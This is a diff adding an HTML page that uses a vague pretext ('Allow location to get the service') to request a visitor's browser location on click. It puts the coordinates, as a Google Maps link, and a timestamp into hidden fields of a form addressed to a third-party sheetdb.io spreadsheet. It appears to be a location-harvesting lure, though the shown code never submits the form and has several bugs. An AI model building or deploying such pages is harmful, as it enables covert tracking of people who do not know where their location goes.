@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <h1>Allow location to get the service</h1>
+<p id=p_id></p>
+
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+<label style="font-size:20px" id='show_loc'></label>
+
+<div id="canvasContainer" onclick="show_ord(event)">
+                          <canvas id="canvas" width="3000" height="3000",class='mycanvas'>
+                            
+                           </canvas>
+
+
+
+
+<script>
+
+function show_ord(){
+  para=document.getElementById("p_id")
+ data_x=getLocation();
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+    para.innerHTML="try the link on better browser like Chrome";
+  } else { 
+    para.innerHTML="could not run geolocation";
+     
+  }
+
+}
+
+function showPosition(position) {
+  
+
+var today = new Date();
+var date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();
+var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
+var dateTime = date+' '+time;
+document.getElementById("time_stamp").value=dateTime;
+
+
+
+var latlon = position.coords.latitude + "," + position.coords.longitude;
+
+  var img_url = "https://www.google.com/maps/search/?api=1&query="+latlon;
+document.getElementById("lat").value=img_url;
+//document.getElementById("lon").value=position.coords.longitude;
+
+console.log(latlon);
+ document.getElementById('show_loc').innerHTML=latlon;
+}
+
+
+}
+        
+       
+        
+  
+
+
+
+</script>
+
+
+
+
+
+
+
+
+
+<form name="f_name" id="myForm" action="https://sheetdb.io/api/v1/tzligcj8zu6x4" method="POST" id="sheetdb-form">
+   <input type="hidden" name="time_stamp" id="time_stamp">
+  <input type="hidden" name="Latitude" id="lat" value="nothing">
+  
+ 
+
+</form>
+
+
+
+
+
+
+</body>
+</html>
+
